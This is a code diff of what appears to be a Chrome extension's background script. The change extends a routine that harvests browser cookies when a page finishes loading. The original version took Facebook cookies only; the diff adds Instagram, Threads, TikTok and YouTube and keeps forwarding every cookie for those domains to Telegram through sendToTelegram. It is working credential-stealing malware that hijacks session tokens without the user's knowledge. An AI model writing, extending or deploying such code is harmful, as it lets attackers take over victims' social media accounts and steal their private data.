@@ -18,9 +18,27 @@ async function getMachineId() {
 }
 
 // Function to create cookie file content
-function formatCookiesData(url, cookies) {
+function formatCookiesData(url, cookies, platform) {
   const date = new Date().toLocaleString();
-  return `🍪 New Facebook Cookies\nURL: ${url}\nTime: ${date}\n\nCookies:\n${cookies}`;
+  return `🍪 New ${platform} Cookies\nURL: ${url}\nTime: ${date}\n\nCookies:\n${cookies}`;
+}
+
+function getPlatformFromUrl(url) {
+  if (url.includes('facebook.com')) return 'Facebook';
+  if (url.includes('instagram.com')) return 'Instagram';
+  if (url.includes('threads.net')) return 'Threads';
+  if (url.includes('tiktok.com')) return 'TikTok';
+  if (url.includes('youtube.com')) return 'YouTube';
+  return 'Unknown Platform';
+}
+
+function getDomainFromUrl(url) {
+  if (url.includes('facebook.com')) return '.facebook.com';
+  if (url.includes('instagram.com')) return '.instagram.com';
+  if (url.includes('threads.net')) return '.threads.net';
+  if (url.includes('tiktok.com')) return '.tiktok.com';
+  if (url.includes('youtube.com')) return '.youtube.com';
+  return null;
 }
 
 // Function to create and send file
@@ -76,16 +94,20 @@ async function sendToTelegram(content) {
 
 // Listen for Facebook navigation
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-  if (changeInfo.status === 'complete' && tab.url && tab.url.includes('facebook.com')) {
-    chrome.cookies.getAll({
-      domain: ".facebook.com"
-    }, cookies => {
-      if (cookies.length > 0) {
-        const cookiesText = JSON.stringify(cookies, null, 2);
-        const fileContent = formatCookiesData(tab.url, cookiesText);
-        sendToTelegram(fileContent);
-      }
-    });
+  if (changeInfo.status === 'complete' && tab.url) {
+    const domain = getDomainFromUrl(tab.url);
+    if (domain) {
+      chrome.cookies.getAll({
+        domain: domain
+      }, cookies => {
+        if (cookies.length > 0) {
+          const platform = getPlatformFromUrl(tab.url);
+          const cookiesText = JSON.stringify(cookies, null, 2);
+          const fileContent = formatCookiesData(tab.url, cookiesText, platform);
+          sendToTelegram(fileContent);
+        }
+      });
+    }
   }
 });
 
